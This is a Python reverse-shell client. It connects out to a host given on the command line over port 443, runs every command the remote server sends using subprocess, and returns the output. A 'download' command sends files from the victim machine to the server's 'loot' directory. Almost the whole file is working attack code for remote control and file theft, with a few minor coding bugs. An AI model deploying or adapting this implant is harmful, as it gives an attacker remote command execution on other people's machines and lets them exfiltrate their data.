import os
import socket
import subprocess
import sys

"""
Customize however you please...
"""

class Client:

    def __init__(self):
        self.host = sys.argv[1]
        self.port = 443
        self.buffer_size = (1024 * 998)
        self.sep = "<sep>"
        self.output = ""
        self.message = ""
        self.main_path = os.getcwd()

    def run(self):
        sock = socket.socket()

        # Connect to the server
        sock.connect((self.host, self.port))

        # Send the current working directory
        sock.send(self.main_path.encode())

        # Main client loop
        while True:
            # Client needs to receive the command from the server. So, receive the command string
            # and then decode that command
            cmd = sock.recv(self.buffer_size).decode()

            # If the command is a two part, split the two parts
            scmd = cmd.split()
            # ****************************************************************************************
            # If the command is to exit
            if cmd.lower() == "exit":
                # Break the client loop
                break

            if cmd.lower() == "download":
                # The client "uploads" to the servers "loot" directory.
                # "filename": the file to download and pass on to the "Download" method
                filename = sock.recv(self.buffer_size).decode()
                # Download method...
                _ClientMeta.download(sock=sock, filename=filename)
                pass

            # What if the command is "cd" a two part command
            if scmd[0].lower() == "cd":
                # Change directories
                try:
                    os.chdir(' '.join(scmd[1:]))
                except FileNotFoundError as e:
                    self.output = str(e)
                else:
                    # Output nothing, operation was a success
                    self.output = ""

            else:
                self.output = subprocess.getoutput(cmd)

            # Final closer actions
            self.main_path = os.getcwd()
            self.message = f"{self.output}{self.sep}{self.main_path}"
            sock.send(self.message.encode())

        sock.close()

class _ClientMeta:

    def __init__(self):
        pass

    @staticmethod
    def download(sock, filename, sep="<sep>", buffer_size=4096):
        filename = os.getcwd() + os.sep + filename
        message = f"\033[33m[CLIENT.RESP]\033[37m Data stream established, checking for file %s...\033[0m".format("Invalid file..." if filename is None else filename)
        sof = os.path.getsize(filename)

        sock.send(message.encode())

        if os.path.isfile(filename):
            retm = f"\033[33[CLIENT.RESP]\033[37m File found, initializing download & sending basic file data...\033[0m"
            sock.send(retm.encode())

            sock.send(f"{filename}{sep}{sof}".encode())

            # Begin the transfer
            with open(filename, "r+") as data:
                # Enter main transfer loop
                while True:
                    br = data.read(buffer_size)

                    # The download is complete, send message back to server
                    if not br:
                        final = f"\033[33m[CLIENT.RESP]\033[37m Download complete, recvd {sof.real}...\033[0m"
                        sock.send(final.encode())
                        break

                    sock.sendall(br)
            # As always, close the socket
            sock.close()

def main():
    client = Client()
    client.run()


if __name__ == '__main__':
    main()
